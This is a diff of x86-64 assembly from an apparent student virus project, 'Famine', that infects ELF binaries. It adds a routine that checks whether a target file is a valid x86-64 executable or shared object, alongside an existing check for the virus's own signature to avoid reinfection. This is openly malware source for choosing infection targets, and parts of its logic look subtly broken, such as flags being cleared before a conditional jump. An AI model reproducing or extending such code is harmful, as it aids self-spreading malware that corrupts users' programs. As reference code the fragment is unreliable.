@@ -289,6 +289,7 @@ sc_find_txt_seg:
 sc_check_infection:
 				push			rbp
 				mov				rbp,					rsp
+				
 				mov				r8,						qword[sc_glob]
 
 				cmp				qword[r8+0x18],			49
@@ -297,9 +298,7 @@ sc_check_infection:
 				mov				rdi,					qword[r8+0xc60]
 				add				rdi,					qword[r8+0x18]
 				sub				rdi,					49
-
 				lea				rsi,					[sc_sign]
-				
 				mov				rdx,					49
 				call			sc_str_n_cmp
 
@@ -312,6 +311,44 @@ sc_check_infection:
  				mov				rsp,					rbp
 				pop				rbp
 				ret
+sc_test_hdr:
+				push			rbp
+				mov				rbp,					rsp
+				
+				mov				r8,						qword[sc_glob]
+				mov				r9,						qword[r8+0x48]; *hdrs.elf
+
+				lea				rdi,					[r8+0x48]
+				lea				rsi,					[sc_ident]
+				mov				rdx,					5
+				call			sc_str_n_cmp
+
+				cmp				rax,					0
+				jne				.error
+
+				cmp				word[r9+0x12],			62
+				jne				.error
+
+				cmp				word[r9+0x3e],			0
+				je				.error
+
+				cmp				word[r9+0x3e],			65535
+				je				.error
+
+				cmp				word[r9+0x10],			2
+				xor				rax,					rax
+				je				.end
+
+				cmp				word[r9+0x10],			3
+				jne				.error
+				xor				rax,					rax
+ .end:
+ 				mov				rsp,					rbp
+				pop				rbp
+				ret
+ .error:
+ 				mov				rax,					-1
+				jmp				.end
 sc_end:
 
 sc_data:
@@ -325,6 +362,10 @@ sc_real_entry:
 				dq				sc_first_real_entry
 sc_sign:
 				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
+sc_ident:
+				db				"\x7f"
+				db				"ELF"
+				db				"\x2"
 sc_glob:
 				dq				0	; +0x18 -> sz.mem
 									; +0x20 -> sz.code
